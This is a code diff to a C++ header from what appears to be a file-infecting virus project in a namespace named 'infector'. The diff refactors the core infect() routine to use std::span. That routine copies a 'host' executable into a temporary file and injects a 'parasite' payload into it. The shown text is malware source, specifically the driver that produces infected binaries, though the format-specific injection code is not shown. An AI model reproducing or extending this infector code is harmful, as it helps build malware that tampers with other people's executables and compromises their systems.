@@ -1,6 +1,7 @@
 #pragma once
 #include <linux/limits.h>
 #include <stdlib.h>
+#include <span>
 #include "common/file_descriptor.hh"
 #include "common/mmap.hh"
 #include "nostdlib/stdio.hh"
@@ -9,8 +10,8 @@
 namespace vt::infector {
 
 template <typename Infect>
-common::FileDescriptor infect(common::Mmap<PROT_READ> host_mapping,
-                              common::Mmap<PROT_READ> parasite_mapping,
+common::FileDescriptor infect(std::span<const std::byte> host_mapping,
+                              std::span<const std::byte> parasite_mapping,
                               const char* tmp_file_name) {
   Infect infector;
 
@@ -24,18 +25,19 @@ common::FileDescriptor infect(common::Mmap<PROT_READ> host_mapping,
     return output;
   }
 
-  vt::ftruncate(output.handle(), infector.injected_host_size());
+  auto infected_host_size = infector.injected_host_size();
+  vt::ftruncate(output.handle(), infected_host_size);
 
   common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
-      infector.injected_host_size(), MAP_SHARED, output.handle(), 0);
+      infected_host_size, MAP_SHARED, output.handle(), 0);
 
   // Make a writable copy of the host.
-  vt::memcpy(static_cast<void*>(output_host_mapping.mutable_base()),
-             static_cast<const void*>(host_mapping.base()),
+  vt::memcpy(output_host_mapping.mutable_base(), &host_mapping.front(),
              host_mapping.size());
 
-  if (!infector.inject(std::move(output_host_mapping),
-                       std::move(parasite_mapping))) {
+  if (!infector.inject(std::span<std::byte>(output_host_mapping.mutable_base(),
+                                            output_host_mapping.size()),
+                       parasite_mapping)) {
     return common::FileDescriptor{};
   }
   return output;
@@ -86,8 +88,11 @@ bool infect(const char* host_path, const char* parasite_path) {
   vt::strcpy(tmp, host_path);
   tmp[len] = '.';
   tmp[len + 1] = '\0';
-  auto output_fd =
-      infect<Infect>(std::move(host_mapping), std::move(parasite_mapping), tmp);
+  auto output_fd = infect<Infect>(
+      std::span<const std::byte>(host_mapping.base(), host_mapping.size()),
+      std::span<const std::byte>(parasite_mapping.base(),
+                                 parasite_mapping.size()),
+      tmp);
 
   if (!output_fd.valid()) {
     return false;
